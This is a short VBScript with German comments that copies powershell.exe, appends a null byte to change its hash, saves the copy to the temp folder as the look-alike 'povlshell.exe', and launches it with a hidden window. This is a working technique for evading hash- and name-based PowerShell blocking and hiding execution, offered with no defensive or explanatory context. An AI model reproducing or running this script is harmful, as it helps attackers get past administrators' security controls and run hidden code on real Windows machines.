Dim Filename
Dim Bytearray
Dim bin
Dim Arraylength
Dim newFilename
Dim dir
Dim name
Dim retval
Dim objShell
Dim i

Filename = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"

Set bin = CreateObject("ADODB.Stream")
bin.Type = 1
bin.Open
bin.LoadFromFile Filename

' Bytearray als Variant speichern
Bytearray = bin.Read
bin.Close

' Prüfen, ob Bytearray tatsächlich ein Array ist
If IsArray(Bytearray) Then
    ' Bytearray um ein Null-Byte erweitern
    Arraylength = UBound(Bytearray)
    ReDim Preserve Bytearray(Arraylength + 1)
    Bytearray(Arraylength + 1) = 0
Else
    WScript.Echo "Fehler: Bytearray konnte nicht erstellt werden."
    WScript.Quit
End If

' Neuen Stream für das Schreiben öffnen
Set bin = CreateObject("ADODB.Stream")
bin.Type = 1
bin.Open
bin.Write Bytearray  ' Korrekt: Bytearray wird direkt geschrieben
bin.Position = 0

' Zielverzeichnis für neue Datei setzen
Set objShell = CreateObject("WScript.Shell")
dir = objShell.ExpandEnvironmentStrings("%TEMP%")
name = "povlshell.exe"
newFilename = dir & "\" & name

' Datei speichern
bin.SaveToFile newFilename, 2
bin.Close
Set bin = Nothing

' Datei ausführen
retval = objShell.Run(newFilename, 0, False)
Set objShell = Nothing
